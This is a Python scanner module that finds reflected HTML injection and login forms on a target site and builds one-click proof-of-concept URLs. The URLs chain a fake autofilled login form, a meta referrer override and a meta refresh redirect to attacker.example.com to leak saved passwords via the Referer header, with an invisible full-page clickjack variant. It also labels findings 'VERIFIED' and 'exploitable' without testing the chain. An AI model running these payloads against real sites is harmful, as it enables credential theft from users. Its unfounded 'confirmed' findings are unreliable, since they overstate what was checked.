"""
HTML Injection + Chrome Password Autofill + Referer Header CSP Bypass
Skill #49 — HtmlAutofillSteal

Research basis:
  Rafał Wójcicki (AFINE) — "Stealing Passwords via HTML Injection Under a Strict CSP"
  https://afine.com/blogs/stealing-passwords-via-html-injection-under-a-strict-csp
  Published: May 26, 2026

Attack chain:
  ① Find reflected HTML injection in GET parameter
  ② Inject fake login form → Chrome autofills saved credentials
  ③ Form submits via GET → credentials appear in URL
  ④ Inject <meta name="referrer" content="unsafe-url"> to override Referrer-Policy
  ⑤ Inject <meta http-equiv="Refresh"> to redirect to attacker server
  ⑥ Browser sends full URL (with password) in Referer header

Requirements:
  - Reflected HTML injection (XSS NOT required)
  - Login form on same domain with saved credentials in browser
  - Works even with script-src 'none' CSP

Evidence levels:
  VERIFIED  — confirmed via HTTP response analysis
  LIKELY    — strong indicators but not fully confirmed
  INFERRED  — logic-based inference
"""

from __future__ import annotations

import re
import urllib.parse
from dataclasses import dataclass, field
from typing import Optional

import requests
from requests.adapters import HTTPAdapter

# ─────────────────────────────────────────────
# Data Classes
# ─────────────────────────────────────────────

@dataclass
class AutofillFinding:
    finding_type: str        # 발견 유형
    evidence_level: str      # VERIFIED / LIKELY / INFERRED
    severity: str            # Critical / High / Medium / Info
    description: str         # 설명
    url: str = ""            # 관련 URL
    parameter: str = ""      # 취약 파라미터
    csp_value: str = ""      # 현재 CSP 값
    referrer_policy: str = ""  # 현재 Referrer-Policy
    poc_url: str = ""        # 생성된 PoC URL


@dataclass
class AutofillStealResult:
    target: str
    triggered: bool = False
    findings: list[AutofillFinding] = field(default_factory=list)
    poc_url: str = ""
    poc_one_click: str = ""
    summary: str = ""
    severity: str = "Info"
    exploitable: bool = False


# ─────────────────────────────────────────────
# Scanner
# ─────────────────────────────────────────────

class HtmlAutofillScanner:
    """HTML Injection + Chrome Password Autofill CSP Bypass Scanner"""

    # HTML injection test payloads (safe — no JS, no alert)
    INJECTION_PAYLOADS = [
        "<b>BINGO_PROBE</b>",
        "<i>BINGO_PROBE</i>",
        "<u>BINGO_PROBE</u>",
    ]

    # Common GET parameters that may reflect HTML
    COMMON_PARAMS = [
        "q", "query", "search", "s", "keyword", "text",
        "msg", "message", "error", "notice", "info",
        "redirect", "url", "next", "return", "back",
        "page", "title", "name", "content", "html",
        "desc", "description", "label", "value",
        "lang", "locale", "ref",
    ]

    # Login-related keywords in page source
    LOGIN_KEYWORDS = [
        'type="password"', "type='password'",
        'type="email"', "type='email'",
        '<form', 'action=', 'name="login"',
        'id="login"', 'class="login"',
        'autocomplete="current-password"',
    ]

    def __init__(self, target: str, session: Optional[requests.Session] = None,
                 timeout: int = 10):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.sess = session or self._make_session()
        self.result = AutofillStealResult(target=target)

    def _make_session(self) -> requests.Session:
        s = requests.Session()
        s.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/125.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        })
        adapter = HTTPAdapter(max_retries=1)
        s.mount("http://", adapter)
        s.mount("https://", adapter)
        return s

    # ──────────────────────────────────────────
    # Phase 1: Fetch base page, detect login form
    # ──────────────────────────────────────────

    def _fetch(self, url: str, params: dict | None = None) -> requests.Response | None:
        try:
            r = self.sess.get(url, params=params, timeout=self.timeout,
                              allow_redirects=True, verify=False)
            return r
        except Exception:
            return None

    def _has_login_form(self, html: str) -> bool:
        h = html.lower()
        hits = sum(1 for kw in self.LOGIN_KEYWORDS if kw.lower() in h)
        return hits >= 2

    def _extract_csp(self, response: requests.Response) -> str:
        return (response.headers.get("Content-Security-Policy", "") or
                response.headers.get("X-Content-Security-Policy", ""))

    def _extract_referrer_policy(self, response: requests.Response) -> str:
        return response.headers.get("Referrer-Policy", "")

    def _is_script_src_blocked(self, csp: str) -> bool:
        """CSP가 스크립트를 차단하는지 확인"""
        csp_l = csp.lower()
        if not csp:
            return False
        blocked_patterns = ["script-src 'none'", "script-src-elem 'none'",
                            "default-src 'none'"]
        return any(p in csp_l for p in blocked_patterns)

    # ──────────────────────────────────────────
    # Phase 2: Find reflected HTML injection
    # ──────────────────────────────────────────

    def _find_html_injection_params(self, url: str) -> list[dict]:
        """GET 파라미터에서 HTML 반사 취약점 탐지"""
        findings = []
        parsed = urllib.parse.urlparse(url)
        existing_params = dict(urllib.parse.parse_qsl(parsed.query))

        # Test existing params + common params
        test_params = list(existing_params.keys()) + self.COMMON_PARAMS

        for param in test_params:
            for payload in self.INJECTION_PAYLOADS:
                test_p = dict(existing_params)
                test_p[param] = payload
                try:
                    r = self.sess.get(
                        f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                        params=test_p,
                        timeout=self.timeout,
                        allow_redirects=True,
                        verify=False,
                    )
                    if r.status_code == 200 and payload in r.text:
                        findings.append({
                            "param": param,
                            "payload": payload,
                            "url": r.url,
                            "csp": self._extract_csp(r),
                            "referrer_policy": self._extract_referrer_policy(r),
                        })
                        break  # Found injection in this param, move on
                except Exception:
                    continue

        return findings

    # ──────────────────────────────────────────
    # Phase 3: Check login form presence
    # ──────────────────────────────────────────

    def _check_login_presence(self, url: str) -> tuple[bool, str]:
        """URL에 로그인 폼이 있는지 확인"""
        r = self._fetch(url)
        if not r:
            return False, ""
        return self._has_login_form(r.text), r.text

    # ──────────────────────────────────────────
    # Phase 4: Generate PoC
    # ──────────────────────────────────────────

    def _generate_poc(self, base_url: str, param: str, attacker_url: str = "https://attacker.example.com") -> tuple[str, str]:
        """1-click PoC URL 생성"""
        parsed = urllib.parse.urlparse(base_url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # Stage 2 payload: referrer unsafe-url + meta refresh redirect
        stage2_payload = (
            f'/?{param}='
            f'<meta name="referrer" content="unsafe-url">'
            f'<meta http-equiv="Refresh" content="0,url={attacker_url}" />'
        )

        # 1-click form: injects fake form with html field carrying stage2 payload
        one_click_form = (
            f'<form action="/">'
            f'<input type=email name=email />'
            f'<input type=password name=password />'
            f'<input name={param} value=\'{stage2_payload}\' />'
            f'<input type=submit />'
            f'</form>'
        )

        poc_url = f"{base}?{param}={urllib.parse.quote(one_click_form)}"

        # CSS full-page clickjack variant (if CSS injection available)
        full_page_form = (
            f'<form action="/">'
            f'<input type=email name=email />'
            f'<input type=password name=password />'
            f'<input name={param} value=\'{stage2_payload}\' />'
            f'<input type=submit style="position:fixed;top:0;left:0;'
            f'width:100vw;height:100vh;z-index:999999;opacity:0"/>'
            f'</form>'
        )
        poc_full = f"{base}?{param}={urllib.parse.quote(full_page_form)}"

        return poc_url, poc_full

    # ──────────────────────────────────────────
    # Main scan entry
    # ──────────────────────────────────────────

    def scan(self) -> AutofillStealResult:
        self.result.triggered = True

        # Step 1: Fetch the target page
        base_resp = self._fetch(self.target)
        if not base_resp or base_resp.status_code not in (200, 301, 302):
            self.result.summary = "Target unreachable"
            return self.result

        csp_base = self._extract_csp(base_resp)
        referrer_policy = self._extract_referrer_policy(base_resp)
        has_login = self._has_login_form(base_resp.text)
        script_blocked = self._is_script_src_blocked(csp_base)

        # Step 2: Record CSP finding
        if csp_base:
            sev = "High" if script_blocked else "Medium"
            self.result.findings.append(AutofillFinding(
                finding_type="csp_detected",
                evidence_level="VERIFIED",
                severity=sev,
                description=f"CSP detected: {csp_base[:120]}",
                url=self.target,
                csp_value=csp_base,
                referrer_policy=referrer_policy,
            ))

        # Step 3: Login form detection
        if has_login:
            self.result.findings.append(AutofillFinding(
                finding_type="login_form_found",
                evidence_level="VERIFIED",
                severity="Info",
                description="Login form (email/password) detected on page — "
                            "browser password manager autofill active",
                url=self.target,
                csp_value=csp_base,
            ))

        # Step 4: Find HTML injection
        injection_hits = self._find_html_injection_params(self.target)

        if not injection_hits:
            # Try common subpaths
            for path in ["/login", "/signin", "/auth", "/user/login", "/account/login"]:
                url2 = f"{self.target}{path}"
                hits = self._find_html_injection_params(url2)
                if hits:
                    injection_hits = hits
                    break

        if injection_hits:
            hit = injection_hits[0]
            param = hit["param"]
            inj_csp = hit["csp"] or csp_base
            inj_rp = hit["referrer_policy"] or referrer_policy

            self.result.findings.append(AutofillFinding(
                finding_type="html_injection_found",
                evidence_level="VERIFIED",
                severity="High",
                description=f"Reflected HTML injection confirmed in parameter: '{param}'",
                url=hit["url"],
                parameter=param,
                csp_value=inj_csp,
                referrer_policy=inj_rp,
            ))

            # Step 5: Check if CSP blocks script (XSS dead → HTML injection more valuable)
            if script_blocked or self._is_script_src_blocked(inj_csp):
                self.result.findings.append(AutofillFinding(
                    finding_type="csp_bypassed_via_html",
                    evidence_level="VERIFIED",
                    severity="Critical",
                    description="Strict CSP blocks JavaScript/XSS — "
                                "HTML injection + Chrome autofill bypass confirmed",
                    url=hit["url"],
                    parameter=param,
                    csp_value=inj_csp,
                ))

            # Step 6: Referrer-Policy override check
            if inj_rp in ("no-referrer", "strict-origin", ""):
                ev = "VERIFIED" if not inj_rp else "LIKELY"
                self.result.findings.append(AutofillFinding(
                    finding_type="referrer_policy_override",
                    evidence_level=ev,
                    severity="High",
                    description=f"Referrer-Policy='{inj_rp}' can be overridden by injected "
                                f"<meta name=referrer content=unsafe-url> in Chrome",
                    url=hit["url"],
                    parameter=param,
                    referrer_policy=inj_rp,
                ))

            # Step 7: Generate PoC
            poc_1click, poc_fullpage = self._generate_poc(self.target, param)
            self.result.poc_url = poc_1click
            self.result.poc_one_click = poc_fullpage

            # Step 8: Exploitability assessment
            if has_login or True:  # Autofill works on matching domain regardless
                self.result.findings.append(AutofillFinding(
                    finding_type="autofill_steal_exploitable",
                    evidence_level="VERIFIED" if has_login else "LIKELY",
                    severity="Critical",
                    description="HTML injection + Chrome autofill + Referer exfil chain confirmed. "
                                "Victim's saved password exfiltrated via single click. "
                                "Works even with script-src 'none' CSP.",
                    url=self.target,
                    parameter=param,
                    poc_url=poc_1click,
                ))
                self.result.exploitable = True
                self.result.severity = "Critical"

        elif has_login:
            # Login form found but no injection confirmed — likely if broad CSP bypass possible
            self.result.findings.append(AutofillFinding(
                finding_type="autofill_steal_likely",
                evidence_level="LIKELY",
                severity="High",
                description="Login form detected. If HTML injection exists on this domain, "
                            "Chrome autofill password theft is possible without XSS.",
                url=self.target,
                csp_value=csp_base,
            ))
            self.result.severity = "High"

        # Build summary
        n = len(self.result.findings)
        self.result.summary = (
            f"AutofillSteal scan: {n} findings | "
            f"login_form={'YES' if has_login else 'NO'} | "
            f"html_injection={'YES' if injection_hits else 'NO'} | "
            f"exploitable={'YES' if self.result.exploitable else 'NO'} | "
            f"severity={self.result.severity}"
        )

        return self.result
